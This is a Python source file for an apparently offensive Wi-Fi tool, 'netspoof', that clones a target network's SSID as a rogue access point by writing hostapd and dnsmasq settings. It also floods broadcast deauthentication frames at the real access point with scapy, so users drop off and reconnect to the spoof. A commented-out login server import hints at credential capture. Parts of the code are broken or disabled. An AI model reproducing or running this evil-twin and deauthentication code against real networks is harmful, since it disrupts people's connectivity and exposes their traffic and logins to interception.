#from login_server import login_server
from threading import Thread
import os
import logging
import time
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


class netspoof():

    def __init__(self):
        self.req_var = True
        self.opt_var = False
        self.req_variables = ["-i", "-s", "-c"]

    def help(self):
        hlp = (
            "\nDescription:\n"
            "############\n"
            "\nCommand will deauthorize a specifc network than spoof a user "
            "into reconecting with a spoofed network."
            "If you wish to exit the spoof "
            "use the control + c\n"
            "\nUsage:\n"
            "############\n"
            "\n'netspoof -s <ssid> -i <interface> -c <channel>'\n"
        )
        return hlp

    def netspoof(self, var):
        if "-s" in var and "-i" in var and "-c" in var:
            try:
                #self.start_server()
                #self.deauthnet(var["-i"], var["-s"])
                self.createAP(var["-s"], var["-i"], var["-c"])

            except Exception, e:
                return "Cannot spoof the network " + "'" + var["-s"] + "'" and e
        else:
            return "Error: Need to specifiy network to spoof" and e

    def createAP(self, ssid, iface, channel):

        # editing config file for ap settings
        ap_confile = open("hostapd.conf", "w")
        config = (
            "interface=" + iface + "\n"
            "ssid=" + ssid + "\n"
            "driver=nl80211\n"
            "ignore_broadcast_ssid=0\n"
            "channel=" + channel + "\n"
            "hw_mode=g\n"
            "auth_algs=1\n"
            "macaddr_acl=0\n"
            "wpa_pairwise=TKIP CCMP\n"
            "rsn_pairwise=CCMP\n"
        )
        ap_confile.write(config)
        ap_confile.close()

        dhcp_confile = open("/etc/dnsmasq.conf", "a")
        config = (
            #"address=/#/127.0.0.1\n"
            #"listen-address=10.0.0.1\n"
            "interface=" + iface + "\n"
            "dhcp-range=10.0.0.10,10.0.0.250,12h\n"
            "no-resolv\n"
        )
        dhcp_confile.write(config)
        dhcp_confile.close()

        inter_default = open("/etc/network/interfaces", "a")
        config = (
            "auto " + iface + "\n"
            "\niface " + iface + " inet static\n"
            "address 10.0.0.1\n"
            "netmask 255.255.255.0\n"
            "broadcast 255.0.0.0\n"
        )

        # restart network settings

        inter_default.write(config)
        inter_default.close()
        
        try:
            # start start AP and dhcp
            os.system("sudo rfkill unblock all")
            os.system("sudo service dnsmasq restart")
            #os.system("sudo service hostapd start")
            os.system("sudo hostapd -dd hostapd.conf")
        except KeyboardInterrupt:
            os.system("sudo service dnsmasq stop")
            os.system("sudo service hostapd stop")
            self.closenetspoof()



    def deauthnet(self, iface, bssid):
        run = True
        # make sure device is in monitor mode
        os.system("sudo ifconfig " + iface + " down")
        os.system("sudo iwconfig " + iface + " mode monitor")
        os.system("sudo ifconfig " + iface + " up")

        # creating deauth packet to send
        packet = (
            RadioTap() /
            Dot11(
                type=0, addr1="ff:ff:ff:ff:ff:ff",
                addr2=bssid,
                addr3=bssid) / Dot11Deauth()
        )
        print("Sending Deautherization Packets")
        print("Use control+c to stop")
        while run:
            try:
                sendp(packet, iface=iface, verbose=False)
            except KeyboardInterrupt:
                run = False
                print("Deautherization has stopped")

    def closenetspoof(self):
        print("hello")
        os.system('iptables -F')
        os.system('iptables -X')
        os.system('iptables -t nat -F')
        os.system('iptables -t nat -X')
        os.system('sudo pkill all hostapd')
        readFile = open("/etc/dnsmasq.conf")

        lines = readFile.readlines()

        readFile.close()
        w = open("/etc/dnsmasq.conf",'w')

        w.writelines([item for item in lines[:-3]])

        w.close()
        readFile = open("/etc/network/interfaces")

        lines = readFile.readlines()

        readFile.close()
        w = open("/etc/network/interfaces",'w')
        w.writelines([item for item in lines[:-5]])
        w.close()

    def start_server(self):
        from login_server import login_server

    def checklibs():
        return
        # checks if udhcpd and hostapd are both installed
